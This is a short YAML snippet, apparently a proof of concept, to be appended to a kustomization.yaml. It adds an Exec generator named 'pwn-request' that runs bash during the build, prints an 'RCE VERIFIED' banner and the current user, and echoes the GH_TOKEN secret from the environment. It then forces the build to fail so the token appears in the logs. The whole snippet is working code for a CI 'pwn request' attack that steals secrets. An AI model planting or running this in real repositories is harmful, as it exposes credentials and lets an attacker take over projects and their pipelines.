# Append this to the existing kustomization.yaml
generators:
  - |-
    kind: Exec
    metadata:
      name: pwn-request
    spec:
      bin: /bin/bash
      args:
        - -c
        - |
          echo "=========================================="
          echo "!!! RCE VERIFIED !!!"
          echo "Run by: $(whoami)"
          echo "Secret Scope Check:"
          env | grep GH_TOKEN | head -n 1
          echo "=========================================="
          # This exit 1 is CRITICAL. It forces the build to fail so you see the logs.
          exit 1
